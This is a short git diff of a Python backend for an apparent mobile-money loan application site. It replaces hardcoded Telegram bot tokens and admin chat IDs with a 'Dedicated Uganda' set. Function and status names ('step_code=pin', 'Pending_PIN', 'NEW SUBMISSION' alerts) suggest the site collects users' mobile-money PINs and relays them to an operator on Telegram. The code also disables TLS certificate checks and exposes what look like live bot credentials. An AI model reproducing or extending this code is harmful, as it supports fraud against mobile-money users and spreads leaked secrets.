@@ -14,9 +14,9 @@ client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
-# Telegram Configuration for Uganda 🇬🇭/🇺🇬
-TELEGRAM_BOT_TOKEN = "8893269969:AAGsjLNbAycQBkRByEGdZslWg-mT_MSuwAM"
-TELEGRAM_ADMIN_CHAT_ID = "7554571504"
+# Dedicated Uganda Telegram Configuration 🇺🇬
+TELEGRAM_BOT_TOKEN = "8802138287:AAHXDX_8S-OGN4NBemcQPdI3uZzFsICDQh4"
+TELEGRAM_ADMIN_CHAT_ID = "7217281586"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
@@ -271,7 +271,6 @@ def check_status():
         record = applications_collection.find_one({"app_id": app_id})
         
     if record:
-        # Also store MongoDB ID in session for subsequent POST requests
         session["current_app_id"] = str(record["_id"])
         return jsonify({
             "status": record.get("status", "Pending_PIN"),
